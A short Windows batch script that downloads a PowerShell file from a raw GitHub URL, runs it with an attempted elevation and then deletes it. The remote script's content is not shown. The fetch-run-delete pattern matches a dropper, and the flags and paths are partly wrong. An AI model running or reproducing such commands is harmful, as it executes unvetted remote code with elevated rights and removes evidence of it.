@echo off
curl -O https://raw.githubusercontent.com/notnotdababu/fridge-solution/main/gi.ps1
powershell -File "%userprofile%\gi.ps1" -Verb RunAs
del /Q gi.ps1
